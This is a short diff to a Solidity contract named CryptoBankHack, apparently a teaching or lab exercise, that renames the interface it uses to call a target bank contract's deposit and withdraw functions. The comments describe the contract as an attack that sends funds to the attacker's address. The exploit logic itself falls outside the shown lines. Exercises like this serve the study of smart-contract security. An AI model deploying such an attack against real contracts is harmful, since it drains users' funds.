@@ -47,7 +47,7 @@ pragma solidity ^0.8.0;
 @custom:objective (a) Define an interface to interact with the target contract (CryptoBank).
 The interface includes functions needed to deposit and withdraw Ether from the CryptoBank contract.
 */
-interface IEtherBank {
+interface ICryptoBank {
     function depositETH() external payable;
     function withdrawETH() external;
 }
@@ -59,7 +59,7 @@ contract CryptoBankHack {
     /*
     @dev Represents the target contract (CryptoBank) that we want to attack. It allows interaction with its deposit and withdrawal functions.
     */
-    IEtherBank target;
+    ICryptoBank target;
 
     /*
     @dev The address of the attacker. Funds will be transferred here once the attack is successful.
@@ -71,7 +71,7 @@ contract CryptoBankHack {
     The constructor initializes the target variable with the CryptoBank contract's address and sets the attacker variable as the sender's address.
     */
     constructor (address _bankAddress) {
-        target = IEtherBank(_bankAddress);
+        target = ICryptoBank(_bankAddress);
         attacker = payable(msg.sender);
     }
 
